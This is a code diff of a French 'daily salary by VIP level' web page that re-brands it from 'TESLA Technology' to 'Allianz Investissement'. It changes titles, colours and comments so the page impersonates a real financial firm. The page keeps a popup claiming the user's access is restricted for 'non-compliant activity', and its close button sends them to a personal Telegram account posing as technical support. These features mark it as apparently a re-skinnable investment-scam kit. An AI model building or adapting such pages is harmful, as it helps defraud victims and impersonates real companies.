@@ -49,12 +49,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reclamer_salaire'])) 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Salaire - TESLA Technology</title>
+    <title>Salaire - Allianz Investissement</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-    /* VARIABLES THEME TESLA */
+    /* VARIABLES THEME Allianz */
     :root {
-        --tesla-green: #E82127; 
+        --tesla-green: #0038A8; 
         --tesla-dark: #1e1e1e;
         --tesla-black: #000000;
         --tesla-light-gray: #f5f5f5;
@@ -99,7 +99,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reclamer_salaire'])) 
         font-size: 28px;
         font-weight: 700;
         margin-bottom: 8px;
-        /* Titre en rouge TESLA */
+        /* Titre en rouge Allianz */
         color: var(--tesla-green); 
     }
     
@@ -433,7 +433,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reclamer_salaire'])) 
 <body>
     <div class="container">
         <div class="header">
-            <h1>Salaire Quotidien - TESLA Technology</h1>
+            <h1>Salaire Quotidien - Allianz Investissement</h1>
             <p>Recevez votre rémunération quotidienne selon votre niveau VIP</p>
         </div>
         
@@ -548,8 +548,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reclamer_salaire'])) 
                     <i class="fas fa-ban"></i>
                 </div>
                 <div class="popup-message">
-                    Votre accès a été **temporairement restreint** en raison d'une détection d'activité non conforme aux protocoles TESLA Technology (activité non autorisée sur certains niveaux inférieurs).<br><br>
-                    Pour rétablir l'accès et recevoir votre versement, contactez le support technique TESLA Technology immédiatement.
+                    Votre accès a été **temporairement restreint** en raison d'une détection d'activité non conforme aux protocoles Allianz Investissement (activité non autorisée sur certains niveaux inférieurs).<br><br>
+                    Pour rétablir l'accès et recevoir votre versement, contactez le support technique Allianz Investissement immédiatement.
                 </div>
                 <button class="popup-btn" onclick="closePopup()">
                     <i class="fas fa-headset"></i> Contacter le Support Technique
@@ -566,7 +566,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reclamer_salaire'])) 
         
         function closePopup() {
             document.getElementById('blacklistPopup').style.display = 'none';
-            // Rediriger vers le support technique Tesla
+            // Rediriger vers le support technique Allianz
             window.open('https://t.me/sarahicardi12', '_blank');
         }
         
